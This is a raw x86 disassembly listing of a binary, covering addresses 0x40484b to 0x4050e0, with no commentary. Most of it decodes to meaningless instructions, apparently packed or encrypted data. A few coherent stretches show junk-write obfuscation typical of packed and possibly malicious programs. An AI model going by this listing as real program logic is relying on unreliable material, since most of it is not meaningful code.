  40484b:	fisttp QWORD PTR [esi+0x7f652044]
  404851:	pop    DWORD PTR ds:[edx]
  404854:	shl    DWORD PTR [esi-0x22baacfd],cl
  40485a:	mov    BYTE PTR [ecx],0xdb
  40485d:	pop    esp
  40485e:	rcl    DWORD PTR [ecx],1
  404860:	jns    0x404800
  404862:	mov    dh,0x43
  404864:	daa    
  404865:	add    eax,0x12216723
  40486a:	fstp   TBYTE PTR [esi]
  40486c:	dec    edi
  40486d:	loopne 0x40483b
  40486f:	xchg   esp,eax
  404870:	hlt    
  404871:	or     DWORD PTR fs:[esi-0x2],edi
  404875:	lds    ecx,FWORD PTR [esi-0x5]
  404878:	arpl   WORD PTR [ecx+0x29],cx
  40487b:	(bad)  
  40487c:	sbb    al,0xa5
  40487e:	test   bl,dh
  404880:	pop    es
  404881:	xor    DWORD PTR [ebx],esp
  404883:	ret    0x8487
  404886:	(bad)  
  404887:	jle    0x4048c4
  404889:	push   ss
  40488a:	stos   BYTE PTR es:[edi],al
  40488b:	cmp    eax,0x1a8bb3b6
  404890:	inc    ecx
  404891:	popf   
  404892:	mov    eax,ds:0xbb0100a3
  404897:	mov    ds:0xab6f9dc4,eax
  40489c:	add    ebx,edx
  40489e:	push   eax
  40489f:	push   edx
  4048a0:	fdiv   st(3),st
  4048a2:	ins    BYTE PTR es:[edi],dx
  4048a3:	fbld   TBYTE PTR [esi-0x69]
  4048a6:	out    0x22,eax
  4048a8:	jmp    0xe6d437ae
  4048ad:	jle    0x404866
  4048af:	mov    cl,ch
  4048b1:	jbe    0x4048ff
  4048b3:	aaa    
  4048b4:	add    bh,0x2b
  4048b7:	push   0x1a
  4048b9:	mov    esi,0x6ec7e5dc
  4048be:	and    al,0x46
  4048c0:	or     al,0x75
  4048c2:	outs   dx,BYTE PTR ds:[esi]
  4048c3:	xor    edx,esi
  4048c5:	stos   DWORD PTR es:[edi],eax
  4048c6:	mov    esp,0x514c07c7
  4048cb:	stc    
  4048cc:	mov    ax,ds:0x320a62ce
  4048d2:	hlt    
  4048d3:	ret    0xb9b7
  4048d6:	test   al,0xec
  4048d8:	sub    al,0x21
  4048da:	lock mov ebx,0x3b12f015
  4048e0:	leave  
  4048e1:	enter  0x6a5,0x1a
  4048e5:	cmp    dh,BYTE PTR [eax-0x592620bf]
  4048eb:	xlat   BYTE PTR ds:[ebx]
  4048ec:	data16 cmp bh,ch
  4048ef:	adc    BYTE PTR [ecx-0x102569b0],0xed
  4048f6:	pop    ebx
  4048f7:	dec    eax
  4048f8:	sbb    eax,0x85f7c67
  4048fd:	adc    ebx,DWORD PTR [ecx-0x201fda84]
  404903:	xchg   ecx,eax
  404904:	inc    esi
  404905:	hlt    
  404906:	sbb    al,0x84
  404908:	pop    DWORD PTR [edi+0x1e]
  40490b:	(bad)  
  40490c:	outs   dx,BYTE PTR ds:[esi]
  40490d:	aaa    
  40490e:	push   eax
  40490f:	stc    
  404910:	ret    
  404911:	out    0xc9,eax
  404913:	fs inc ebp
  404915:	les    ebx,FWORD PTR [edi+0x71a6c88a]
  40491b:	adc    al,0x87
  40491d:	in     al,dx
  40491e:	outs   dx,DWORD PTR ds:[esi]
  40491f:	push   esi
  404920:	jl     0x404975
  404922:	pop    ebx
  404923:	push   cs
  404924:	mov    DWORD PTR [ebp-0x24],0xf89c85d8
  40492b:	mov    eax,DWORD PTR [ebp-0xc]
  40492e:	sbb    DWORD PTR ds:0x417e59,0x417e51
  404938:	xor    eax,esi
  40493a:	sub    DWORD PTR ds:0x41abde,0x4235cb
  404944:	jmp    0x404abd
  404949:	fst    QWORD PTR [ebx]
  40494b:	cdq    
  40494c:	loope  0x4049a7
  40494e:	jns    0x4049a5
  404950:	and    eax,esi
  404952:	scas   al,BYTE PTR es:[edi]
  404953:	pop    ss
  404954:	(bad)  [bx+si]
  404957:	jl     0x404914
  404959:	fidivr DWORD PTR [edi+0x7e]
  40495c:	jle    0x404938
  40495e:	jg     0x4049de
  404960:	jle    0x404914
  404962:	dec    ebx
  404963:	mov    DWORD PTR [ebx],edi
  404965:	jmp    0x19cd2b3d
  40496a:	loopne 0x404964
  40496c:	outs   dx,BYTE PTR ds:[esi]
  40496d:	int3   
  40496e:	mov    dl,0xe4
  404970:	ret    
  404971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404972:	cli    
  404973:	pop    ss
  404974:	adc    edx,esi
  404976:	xor    DWORD PTR [eax-0x2],edx
  404979:	pop    ss
  40497a:	and    eax,0x317526a6
  40497f:	jp     0x40492c
  404981:	pop    esi
  404982:	xchg   cl,ah
  404984:	scas   al,BYTE PTR es:[edi]
  404985:	xor    al,0xa4
  404987:	aad    0xaf
  404989:	(bad)  
  40498a:	ss or  eax,0x4a99c572
  404990:	rol    BYTE PTR [edx],cl
  404992:	inc    esp
  404993:	mov    edi,0x41f92778
  404998:	mov    esi,0xd09b82df
  40499d:	add    eax,0x562666d5
  4049a2:	xor    eax,0x1eeee46d
  4049a7:	push   ds
  4049a8:	pop    ds
  4049a9:	or     eax,0xdacffe3d
  4049ae:	icebp  
  4049af:	out    dx,eax
  4049b0:	lahf   
  4049b1:	mul    BYTE PTR cs:[eax+0x3f]
  4049b5:	xchg   edi,eax
  4049b6:	cdq    
  4049b7:	pop    eax
  4049b8:	cmc    
  4049b9:	push   edi
  4049ba:	sahf   
  4049bb:	sub    al,0x59
  4049bd:	jmp    0x4049c9
  4049bf:	shl    BYTE PTR [ebp+0xc],1
  4049c2:	sub    al,0xd8
  4049c4:	lds    edx,FWORD PTR gs:[ebx+0xb413ac8]
  4049cb:	test   al,0x40
  4049cd:	push   cs
  4049ce:	inc    ebx
  4049cf:	sti    
  4049d0:	rol    eax,cl
  4049d2:	pop    esp
  4049d3:	bound  esi,QWORD PTR [ebx-0x25]
  4049d6:	or     al,0x5e
  4049d8:	pushf  
  4049d9:	push   ebx
  4049da:	cmp    al,0x20
  4049dc:	pop    esp
  4049dd:	jnp    0x4049ac
  4049df:	dec    eax
  4049e0:	push   edx
  4049e1:	sub    eax,0x3723a7a
  4049e6:	loope  0x404a2b
  4049e8:	xor    bh,BYTE PTR [ecx-0x72f40fbc]
  4049ee:	shl    bh,0xe
  4049f1:	fadd   QWORD PTR [edx+0x412fcea9]
  4049f7:	mov    ebp,0x79673d01
  4049fc:	inc    edi
  4049fd:	mov    al,0x80
  4049ff:	jp     0x4049a7
  404a01:	fist   DWORD PTR [ebp-0x31]
  404a04:	sar    BYTE PTR [edx],0xa5
  404a07:	fidiv  DWORD PTR [ebx-0x5e966cf2]
  404a0d:	inc    ebx
  404a0f:	mov    cl,0x97
  404a11:	outs   dx,BYTE PTR ds:[esi]
  404a12:	mov    bl,BYTE PTR [edi+0x75]
  404a15:	mov    BYTE PTR [ecx+edi*2-0x6210ba6f],ah
  404a1c:	pop    esp
  404a1d:	jae    0x4049f1
  404a1f:	mov    dh,0x1a
  404a21:	mul    DWORD PTR [ebp+0x21b6ba4]
  404a27:	outs   dx,DWORD PTR ds:[esi]
  404a28:	mov    edi,DWORD PTR [eax-0x1c]
  404a2b:	cmp    BYTE PTR [ebp+0x5174d16],cl
  404a31:	(bad)  
  404a32:	cwde   
  404a33:	ins    DWORD PTR es:[edi],dx
  404a34:	cmp    BYTE PTR [edx+0x50bdd08],bh
  404a3a:	add    eax,0xf8b72d65
  404a3f:	mov    ds:0xcc88d8a7,eax
  404a44:	sub    eax,0x6dcf41f9
  404a49:	int3   
  404a4a:	sub    al,al
  404a4c:	imul   esp,DWORD PTR [ecx],0xc1a043f3
  404a52:	mov    al,ds:0xe6b2db63
  404a57:	imul   eax,DWORD PTR [ebx-0x588ca92a],0x13e9acf7
  404a61:	add    DWORD PTR [eax+0x4beff3ef],0x2e
  404a68:	pop    es
  404a69:	sub    ebp,ebx
  404a6b:	xor    ebp,esp
  404a6d:	int    0x90
  404a6f:	push   ecx
  404a70:	adc    BYTE PTR [ebx-0x1a0bb346],ch
  404a76:	in     eax,dx
  404a77:	jle    0x404a0b
  404a79:	adc    DWORD PTR [esi],ebx
  404a7b:	jp     0x404a52
  404a7d:	xchg   edi,eax
  404a7e:	sahf   
  404a7f:	retf   0xe59
  404a82:	out    0xf6,eax
  404a84:	gs enter 0x2f60,0x1f
  404a89:	adc    al,0xfe
  404a8b:	push   0x1c
  404a8d:	cwde   
  404a8e:	repnz bound edi,QWORD PTR [ecx]
  404a91:	cdq    
  404a92:	xchg   esp,eax
  404a93:	mov    ebx,DWORD PTR [ebp-0x2a]
  404a96:	es stos BYTE PTR es:[edi],al
  404a98:	or     ah,BYTE PTR [esi]
  404a9a:	(bad)  
  404a9b:	jmp    0x404a4d
  404a9d:	nop
  404a9e:	and    esp,esi
  404aa0:	mov    esp,0x7b97ba06
  404aa5:	aaa    
  404aa6:	or     DWORD PTR [ebx-0x74],eax
  404aa9:	jecxz  0x404aba
  404aab:	pop    edi
  404aac:	aad    0xc
  404aae:	into   
  404aaf:	out    0x9b,eax
  404ab1:	sar    BYTE PTR [esi+edx*2+0x195aa8eb],1
  404ab8:	adc    al,0xc1
  404aba:	mov    al,0x9d
  404abc:	test   BYTE PTR [ebx],0xc7
  404abf:	mov    DWORD PTR [ebp-0x18],eax
  404ac2:	and    DWORD PTR ds:0x4235cb,0x0
  404acc:	jmp    0x404adc
  404ad1:	mov    eax,ds:0x4235cb
  404ad6:	inc    eax
  404ad7:	mov    ds:0x4235cb,eax
  404adc:	cmp    DWORD PTR ds:0x4235cb,0x1e
  404ae3:	jae    0x404b28
  404ae9:	cmp    DWORD PTR ds:0x4235cb,0x6
  404af0:	jne    0x404b01
  404af6:	push   0x41ae97
  404afb:	call   DWORD PTR ds:0x40d1c4
  404b01:	cmp    DWORD PTR ds:0x4235cb,0x5
  404b08:	jne    0x404b19
  404b0e:	mov    eax,ds:0x4235cb
  404b13:	inc    eax
  404b14:	mov    ds:0x4235cb,eax
  404b19:	jmp    0x404ad1
  404b1e:	sub    DWORD PTR ds:0x415111,0xc33
  404b28:	mov    DWORD PTR [ebp-0x1c],0xf89c853f
  404b2f:	mov    BYTE PTR [ebp-0x1],0x57
  404b33:	sub    DWORD PTR ds:0x417e59,edi
  404b39:	mov    eax,DWORD PTR [ebp-0xc]
  404b3c:	xor    eax,esi
  404b3e:	and    DWORD PTR ds:0x415115,0x5145
  404b48:	add    eax,edi
  404b4a:	mov    DWORD PTR [ebp-0x18],eax
  404b4d:	mov    eax,DWORD PTR [ebp-0x24]
  404b50:	xor    eax,esi
  404b52:	adc    DWORD PTR ds:0x41abde,0x3f71
  404b5c:	add    eax,edi
  404b5e:	and    DWORD PTR ds:0x4235cf,0x352e
  404b68:	push   eax
  404b69:	dec    eax
  404b6a:	mov    eax,DWORD PTR [ebp-0x28]
  404b6d:	xor    eax,esi
  404b6f:	and    DWORD PTR ds:0x4235c3,0x41abce
  404b79:	add    eax,edi
  404b7b:	xor    DWORD PTR ds:0x41abda,0x41237c
  404b85:	push   eax
  404b86:	and    DWORD PTR ds:0x4235cf,0x41abe2
  404b90:	mov    eax,DWORD PTR [ebp-0x1c]
  404b93:	jmp    0x404d0c
  404b98:	push   0xffffff9c
  404b9a:	mov    ds:0x7b617853,al
  404b9f:	xchg   ebp,eax
  404ba0:	push   ebx
  404ba1:	mov    DWORD PTR [ecx+0x3f],esp
  404ba4:	or     al,0xba
  404ba6:	fisub  WORD PTR ss:[esi-0x25818184]
  404bad:	jg     0x404c2d
  404baf:	jle    0x404c13
  404bb1:	jl     0x404bb9
  404bb3:	ja     0x404b42
  404bb5:	xchg   DWORD PTR [edx],edx
  404bb7:	cmp    eax,DWORD PTR [edx+edi*8+0x1603e777]
  404bbe:	push   cs
  404bbf:	sbb    bl,ch
  404bc1:	push   0xffffff9a
  404bc3:	xchg   ebx,eax
  404bc4:	sbb    DWORD PTR [esi-0x3],edx
  404bc7:	int3   
  404bc8:	or     edi,DWORD PTR [ecx]
  404bca:	and    esi,DWORD PTR [edx-0x1a6e1a71]
  404bd0:	inc    esp
  404bd1:	pusha  
  404bd2:	fs cmp al,0xd5
  404bd5:	mov    al,ds:0xc45e0dfe
  404bda:	test   BYTE PTR [ebp-0x6c],0xc
  404bde:	push   ebp
  404bdf:	pop    ebp
  404be0:	fcomp  DWORD PTR [edi+0x39bb11b3]
  404be6:	inc    ecx
  404be7:	adc    al,BYTE PTR [ecx+eax*2-0x54]
  404beb:	mov    ebp,0x4e978f3f
  404bf0:	push   eax
  404bf1:	pop    ecx
  404bf2:	xor    BYTE PTR [ecx+0x10],ch
  404bf5:	pop    eax
  404bf6:	xchg   edx,eax
  404bf7:	repz xchg ebp,eax
  404bf9:	(bad)  
  404bfa:	mov    ebp,0xeaa0b1db
  404bff:	add    cl,BYTE PTR [edx+0x6b]
  404c02:	nop
  404c03:	data16 aad 0xf
  404c06:	dec    esi
  404c07:	xchg   ebx,eax
  404c08:	cmp    cl,dl
  404c0a:	and    eax,0x9defef74
  404c0f:	jno    0x404c8d
  404c11:	xchg   esi,eax
  404c12:	pop    es
  404c13:	xchg   ebp,eax
  404c14:	loopne 0x404c1c
  404c16:	mov    bl,0xfd
  404c18:	(bad)  
  404c19:	fsubr  DWORD PTR [edi-0x64272f47]
  404c1f:	or     DWORD PTR [edx+ebx*2+0x76],0xffffffae
  404c24:	pop    ecx
  404c25:	xor    BYTE PTR [ecx-0x5c],ch
  404c28:	and    dh,BYTE PTR [esp+ebp*1-0x53b59ab0]
  404c2f:	iret   
  404c30:	mov    esi,0xecbd4461
  404c35:	cmp    ecx,DWORD PTR [edi+0x49758d45]
  404c3b:	push   ebx
  404c3c:	add    esp,esp
  404c3e:	xor    eax,DWORD PTR [ebx+0x250464fa]
  404c44:	fstp   QWORD PTR [ebp+0x69]
  404c47:	cli    
  404c48:	repnz pop ds
  404c4a:	push   esi
  404c4b:	sub    DWORD PTR [esi],eax
  404c4d:	xchg   esp,eax
  404c4e:	dec    esi
  404c4f:	sbb    al,0x3e
  404c51:	ficom  WORD PTR ss:[edi+0x63]
  404c55:	fadd   DWORD PTR [ebx+eax*4+0x7c]
  404c59:	mov    cs,ebx
  404c5b:	pop    di
  404c5d:	jb     0x404c30
  404c5f:	add    al,0x4a
  404c61:	or     eax,0x94da7d4
  404c66:	add    edx,DWORD PTR [edi+0x68]
  404c69:	pushf  
  404c6a:	popa   
  404c6b:	push   edx
  404c6c:	or     al,0x82
  404c6e:	jmp    0x404c26
  404c70:	cmc    
  404c71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c72:	(bad)  
  404c73:	or     al,0x32
  404c75:	cmp    eax,0x673df4f4
  404c7a:	push   0x1f
  404c7c:	aas    
  404c7d:	in     eax,dx
  404c7e:	fstp   DWORD PTR [ebx+0x47105e0f]
  404c84:	cmc    
  404c85:	inc    edx
  404c86:	fwait
  404c87:	pop    edi
  404c88:	std    
  404c89:	daa    
  404c8a:	mov    dl,0xa1
  404c8c:	inc    edi
  404c8d:	sbb    edi,DWORD PTR [eax+0x70]
  404c90:	sbb    ch,bl
  404c92:	lahf   
  404c93:	int3   
  404c94:	cli    
  404c95:	push   eax
  404c96:	xor    ch,0xc
  404c99:	pop    esi
  404c9a:	aas    
  404c9b:	test   al,0xeb
  404c9d:	push   DWORD PTR [esi+0x6c44828c]
  404ca3:	aaa    
  404ca4:	retf   
  404ca5:	(bad)  
  404ca6:	nop
  404ca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ca8:	lds    ecx,FWORD PTR [ebx+0x1]
  404cab:	jne    0x404ca0
  404cad:	int    0xd
  404caf:	dec    ebp
  404cb0:	push   cs
  404cb1:	call   0x5217:0x7e0db973
  404cb8:	mov    edi,0x86a97b21
  404cbd:	in     eax,dx
  404cbe:	sbb    bh,BYTE PTR [ebp+0x2e633248]
  404cc4:	dec    ebx
  404cc5:	icebp  
  404cc6:	std    
  404cc7:	lods   al,BYTE PTR ds:[esi]
  404cc8:	cs (bad) 
  404cca:	mov    esi,0xf13f5f89
  404ccf:	and    al,0xb2
  404cd1:	loop   0x404c76
  404cd3:	es (bad) 
  404cd5:	mov    ah,0x81
  404cd7:	sbb    eax,0x26074be6
  404cdc:	xchg   edx,eax
  404cdd:	inc    ebp
  404cde:	frstor [edx-0x58c5b022]
  404ce4:	rcl    DWORD PTR [ebx],cl
  404ce6:	push   ds
  404ce7:	push   edi
  404ce8:	xor    bl,0xb5
  404ceb:	daa    
  404cec:	lock lock add DWORD PTR [esi-0x3bbcdafc],edi
  404cf4:	div    BYTE PTR [edi+ecx*1+0x1b]
  404cf8:	sub    BYTE PTR [ebp+0x7a100260],cl
  404cfe:	arpl   ax,ax
  404d00:	retf   
  404d01:	dec    esp
  404d02:	xor    BYTE PTR [eax],bh
  404d04:	(bad)  
  404d06:	popa   
  404d07:	popf   
  404d08:	rcl    BYTE PTR [ebx+edi*1-0x839ccb0],cl
  404d0f:	sbb    eax,0x415105
  404d14:	add    eax,edi
  404d16:	xor    DWORD PTR ds:0x412364,0x39b1
  404d20:	push   eax
  404d21:	lea    eax,[ebp-0x78]
  404d24:	push   eax
  404d25:	mov    DWORD PTR ds:0x41237c,0x6752
  404d2f:	push   DWORD PTR [ebp-0xc]
  404d32:	sub    DWORD PTR ds:0x415111,0x1b2b
  404d3c:	push   DWORD PTR [ebp-0x14]
  404d3f:	sub    DWORD PTR ds:0x4235c7,0x412364
  404d49:	call   0x409363
  404d4e:	inc    DWORD PTR ds:0x415119
  404d54:	test   eax,eax
  404d56:	mov    DWORD PTR ds:0x4235c7,0x71ec
  404d60:	je     0x404de0
  404d66:	sub    DWORD PTR ds:0x417e59,0x4235db
  404d70:	lea    eax,[ebp-0x78]
  404d73:	neg    DWORD PTR ds:0x4235cf
  404d79:	push   eax
  404d7a:	add    eax,DWORD PTR ds:0x4235db
  404d80:	mov    eax,DWORD PTR [ebp-0x14]
  404d83:	and    DWORD PTR ds:0x417e59,0xd95
  404d8d:	xor    eax,esi
  404d8f:	add    eax,edi
  404d91:	and    DWORD PTR ds:0x417e3d,0x71b6
  404d9b:	push   eax
  404d9c:	mov    eax,DWORD PTR [ebp-0x10]
  404d9f:	add    eax,0xaa
  404da4:	push   eax
  404da5:	and    DWORD PTR ds:0x41abd2,0x17f4
  404daf:	mov    eax,DWORD PTR [ebp-0x10]
  404db2:	sub    DWORD PTR ds:0x417e55,0x41236c
  404dbc:	mov    eax,DWORD PTR [eax+0x198]
  404dc2:	push   DWORD PTR [eax]
  404dc4:	add    DWORD PTR ds:0x417e55,0x417e3d
  404dce:	call   0x40ae4d
  404dd3:	mov    DWORD PTR ds:0x41abd6,0x35a
  404ddd:	mov    DWORD PTR [ebp-0x8],eax
  404de0:	mov    DWORD PTR ds:0x412368,0x764e
  404dea:	cmp    DWORD PTR [ebp-0x8],0x0
  404dee:	not    DWORD PTR ds:0x412364
  404df4:	lea    eax,[ebp+0x4]
  404df7:	mov    DWORD PTR [ebp-0x20],eax
  404dfa:	je     0x405842
  404e00:	lea    eax,[ebp-0x18]
  404e03:	jmp    0x404f7c
  404e08:	ja     0x404d8f
  404e0a:	(bad)  
  404e0b:	je     0x404d9a
  404e0d:	je     0x404d94
  404e0f:	test   DWORD PTR [esi],edi
  404e11:	push   ebx
  404e12:	outs   dx,DWORD PTR ds:[esi]
  404e13:	jne    0x404dda
  404e15:	adc    al,0x7
  404e17:	add    BYTE PTR [edx],0x72
  404e1a:	jle    0x404e9a
  404e1c:	fidivr DWORD PTR [edi+0x7e]
  404e1f:	jle    0x404e13
  404e21:	shl    DWORD PTR [eax],1
  404e23:	or     eax,0xa9edaf58
  404e28:	dec    ebp
  404e29:	or     al,0xf6
  404e2b:	bound  ebx,QWORD PTR [eax-0x4e]
  404e2e:	mov    ebp,ds
  404e30:	bound  esi,QWORD PTR [ebx+0x1f]
  404e33:	xchg   esp,eax
  404e34:	jae    0x404e30
  404e36:	ins    DWORD PTR es:[edi],dx
  404e37:	mov    edi,DWORD PTR [ebx+0x4c]
  404e3a:	lock fisttp QWORD PTR [ecx+0x4b]
  404e3e:	mov    al,0x66
  404e40:	jne    0x404dc7
  404e42:	sqrtps xmm5,XMMWORD PTR [edi]
  404e45:	dec    ecx
  404e46:	jnp    0x404e10
  404e48:	mov    edi,0x5b6c1889
  404e4d:	xor    eax,0x7c7f9a73
  404e52:	daa    
  404e53:	dec    esp
  404e54:	imul   ebx,DWORD PTR [edx],0xffffffc9
  404e57:	cmc    
  404e58:	xchg   edi,eax
  404e59:	sub    BYTE PTR [eax],bl
  404e5b:	je     0x404e8e
  404e5d:	jb     0x404e99
  404e5f:	mov    al,ds:0xaec65128
  404e64:	xchg   edi,eax
  404e65:	cmc    
  404e66:	dec    esi
  404e67:	in     eax,0x5
  404e69:	fcmovu st,st(4)
  404e6b:	stos   DWORD PTR es:[edi],eax
  404e6c:	std    
  404e6d:	cmc    
  404e6e:	adc    bh,0xc5
  404e71:	push   ss
  404e72:	add    BYTE PTR [edi],ch
  404e74:	mov    ecx,0xb0a5e26f
  404e79:	es mov bl,0x2a
  404e7c:	stos   BYTE PTR es:[edi],al
  404e7d:	fild   DWORD PTR ds:0x8dd8245c
  404e83:	int3   
  404e84:	or     DWORD PTR [edi+0x38],ebx
  404e87:	push   0xc153c9e4
  404e8c:	ins    BYTE PTR es:[edi],dx
  404e8d:	jno    0x404ea2
  404e8f:	shl    BYTE PTR [ecx-0x7e],cl
  404e92:	ror    BYTE PTR [esi+eax*8-0x557de92d],0x7a
  404e9a:	loopne 0x404ec8
  404e9c:	fisubr DWORD PTR [edi-0x5c]
  404e9f:	or     DWORD PTR [edx+0x795ca105],ebx
  404ea5:	mov    ah,0x29
  404ea7:	jp     0x404f18
  404ea9:	and    edi,ecx
  404eab:	xchg   ebp,eax
  404eac:	mov    dh,0x2a
  404eae:	aam    0xca
  404eb0:	jbe    0x404f31
  404eb2:	out    0x6d,eax
  404eb4:	(bad)  
  404eb5:	or     eax,0xf6e1f1a7
  404eba:	cs jae 0x404f15
  404ebd:	or     BYTE PTR [ebx],dh
  404ebf:	jo     0x404ea6
  404ec1:	mov    WORD PTR [ecx+edx*8-0x5303a2aa],cs
  404ec8:	inc    ebx
  404ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404eca:	mov    ds:0xff0e2e9,al
  404ecf:	pop    edi
  404ed0:	fidiv  WORD PTR [eax+0x22]
  404ed3:	lds    ebp,FWORD PTR [edi]
  404ed5:	mov    ds:0x18c74eb8,al
  404eda:	hlt    
  404edb:	pusha  
  404edc:	xor    ebx,DWORD PTR ds:0xe25de3e0
  404ee2:	pop    ebx
  404ee3:	es mov edx,edx
  404ee6:	mov    bh,0x5e
  404ee8:	xor    al,BYTE PTR [eax]
  404eea:	test   al,0x1f
  404eec:	dec    ebx
  404eed:	hlt    
  404eee:	int    0x35
  404ef0:	jmp    0x69db9416
  404ef5:	sbb    DWORD PTR [eax-0x49],ecx
  404ef8:	int3   
  404ef9:	inc    edi
  404efa:	addr16 dec ebp
  404efc:	test   BYTE PTR ds:0xfadd004d,al
  404f02:	cmc    
  404f03:	sbb    DWORD PTR [edx-0x1cde8f5a],0xfe7fbd55
  404f0d:	lahf   
  404f0e:	adc    BYTE PTR [edi+0x4c77876c],0xa4
  404f15:	xor    dh,BYTE PTR [edi-0x65]
  404f18:	loope  0x404ea6
  404f1a:	sbb    BYTE PTR [ebx],cl
  404f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f1d:	jmp    0x404f2d
  404f1f:	mov    BYTE PTR [esi],ah
  404f21:	(bad)  
  404f22:	lea    edx,[ebx]
  404f24:	xor    ch,ah
  404f26:	mov    ds:0xbfaa070d,al
  404f2b:	loopne 0x404f7b
  404f2d:	test   DWORD PTR [eax+0x35db6230],edx
  404f33:	inc    ecx
  404f34:	xchg   edi,eax
  404f35:	fisubr WORD PTR [esi+0x26]
  404f38:	jle    0x404f6f
  404f3a:	xor    BYTE PTR [edi],al
  404f3c:	push   edi
  404f3d:	add    DWORD PTR [edi+0x61ea0952],edi
  404f43:	not    cl
  404f45:	push   ebx
  404f46:	les    ecx,FWORD PTR [ebx-0x77]
  404f49:	inc    esp
  404f4a:	xchg   DWORD PTR [edx+0x7f],ecx
  404f4d:	into   
  404f4e:	(bad)  
  404f4f:	pop    ss
  404f50:	inc    edi
  404f51:	addr16 mov esp,0xa2ca7ca7
  404f57:	add    eax,0x153227db
  404f5c:	loope  0x404fcc
  404f5e:	ja     0x404fc5
  404f60:	cmc    
  404f61:	popa   
  404f62:	and    bh,ch
  404f64:	clc    
  404f65:	xor    BYTE PTR [ecx+0xa20f98d],bh
  404f6b:	mov    edx,0xc09d24d2
  404f70:	fisub  DWORD PTR [edi+edx*1]
  404f73:	mov    cl,dl
  404f75:	mov    ecx,0x9aeb85f7
  404f7a:	(bad)  
  404f7b:	jo     0x404fcd
  404f7d:	and    DWORD PTR ds:0x4235bf,0x0
  404f87:	jmp    0x404f97
  404f8c:	mov    eax,ds:0x4235bf
  404f91:	inc    eax
  404f92:	mov    ds:0x4235bf,eax
  404f97:	cmp    DWORD PTR ds:0x4235bf,0x1e
  404f9e:	jae    0x404fc0
  404fa4:	cmp    DWORD PTR ds:0x4235bf,0x22
  404fab:	jne    0x404fba
  404fb1:	push   DWORD PTR [ebp-0x28]
  404fb4:	call   DWORD PTR ds:0x40d298
  404fba:	jmp    0x404f8c
  404fbf:	inc    eax
  404fc0:	mov    eax,DWORD PTR [ebp-0x2c]
  404fc3:	adc    DWORD PTR ds:0x412354,0x412370
  404fcd:	xor    eax,esi
  404fcf:	add    eax,edi
  404fd1:	and    DWORD PTR ds:0x415115,0x3c83
  404fdb:	jmp    0x405154
  404fe0:	adc    al,0x10
  404fe2:	imul   DWORD PTR [edx]
  404fe4:	mov    ebp,DWORD PTR [ecx+0x1f8510a9]
  404fea:	and    DWORD PTR [edx+0x1f0b50d1],esi
  404ff0:	out    dx,al
  404ff1:	jae    0x405071
  404ff3:	jle    0x404fcf
  404ff5:	jg     0x405075
  404ff7:	jle    0x404fce
  404ff9:	jle    0x404ff0
  404ffb:	push   es
  404ffc:	lock inc eax
  404ffe:	mov    ecx,0x596dd4d7
  405003:	retf   0x274
  405006:	aam    0x39
  405008:	mov    ch,0x2f
  40500a:	aam    0x66
  40500c:	aaa    
  40500d:	push   ss
  40500e:	daa    
  40500f:	test   eax,0xca5c3c5a
  405014:	pusha  
  405015:	add    DWORD PTR [ebp-0x115268cb],esp
  40501b:	test   al,0x9f
  40501d:	ins    DWORD PTR es:[edi],dx
  40501e:	adc    ebp,DWORD PTR [eax-0x863fd2b]
  405024:	xchg   BYTE PTR [esi],dh
  405026:	pushf  
  405027:	xchg   esi,eax
  405028:	stos   BYTE PTR es:[edi],al
  405029:	dec    esp
  40502a:	mov    edx,0x451f65ea
  40502f:	push   esp
  405030:	xor    al,0x63
  405032:	xchg   ebp,eax
  405033:	and    al,0xb9
  405035:	lods   eax,DWORD PTR ds:[esi]
  405036:	shl    DWORD PTR [ebx+0x26],0x11
  40503a:	std    
  40503b:	push   edi
  40503c:	jae    0x405089
  40503e:	push   esi
  40503f:	adc    esp,DWORD PTR [ebx-0x2e]
  405042:	pop    ebp
  405043:	(bad)  
  405044:	outs   dx,DWORD PTR ds:[esi]
  405045:	pop    es
  405046:	outs   dx,BYTE PTR ds:[esi]
  405047:	bound  edx,QWORD PTR [esi]
  405049:	adc    DWORD PTR [ebx],0xffffffce
  40504c:	cmc    
  40504d:	std    
  40504e:	jmp    0x4dda:0x9341fcf0
  405055:	iret   
  405056:	mov    ah,0x28
  405058:	dec    edi
  405059:	jle    0x404ff2
  40505b:	ds dec eax
  40505d:	imul   ecx,DWORD PTR [ecx],0x4cb691a4
  405063:	lods   eax,DWORD PTR ds:[esi]
  405064:	out    0x17,al
  405066:	(bad)  
  405067:	xchg   esi,eax
  405068:	or     cl,ah
  40506a:	(bad)
  40506d:	hlt    
  40506e:	inc    edi
  40506f:	stos   BYTE PTR es:[edi],al
  405070:	gs jge 0x40503f
  405073:	pushf  
  405074:	jg     0x405081
  405076:	jge    0x40506d
  405078:	xor    esi,DWORD PTR [esp+ecx*1]
  40507b:	xchg   esp,eax
  40507c:	push   0x32
  40507e:	xchg   ecx,eax
  40507f:	jno    0x405035
  405081:	dec    eax
  405082:	add    eax,0xb5df0f3f
  405087:	cmp    al,0x5f
  405089:	sub    ebp,DWORD PTR [ecx]
  40508b:	clc    
  40508c:	dec    edx
  40508d:	gs ins BYTE PTR es:[edi],dx
  40508f:	pop    ecx
  405090:	(bad)  
  405091:	xchg   ebp,eax
  405092:	adc    eax,0x4300e8ef
  405097:	(bad)  
  405099:	mov    edi,DWORD PTR [ebx+0x12]
  40509c:	mov    edx,0xabb3315
  4050a1:	iret   
  4050a2:	data16 (bad) 
  4050a4:	sbb    ebx,DWORD PTR [edi]
  4050a6:	pop    ebp
  4050a7:	pop    eax
  4050a8:	cmp    cl,dh
  4050aa:	das    
  4050ab:	inc    edi
  4050ac:	jbe    0x405070
  4050ae:	jmp    0x7d5123ca
  4050b3:	mov    ds:0xe01e22a3,al
  4050b8:	scas   eax,DWORD PTR es:[edi]
  4050b9:	sbb    cl,BYTE PTR [ecx+ebp*1+0x79]
  4050bd:	adc    al,0xb
  4050c0:	enter  0xe155,0x28
  4050c4:	mov    fs,ebx
  4050c6:	dec    esi
  4050c7:	mov    edx,0x88d73601
  4050cc:	lods   al,BYTE PTR ds:[esi]
  4050cd:	and    BYTE PTR [edx+0x72a58263],dl
  4050d3:	imul   esi,ebp,0x4
  4050d6:	dec    ebx
  4050d7:	pop    eax
  4050d8:	sbb    eax,0xcae39ef5
  4050dd:	inc    ecx
  4050de:	jnp    0x405125
  4050e0:	pop    ebx
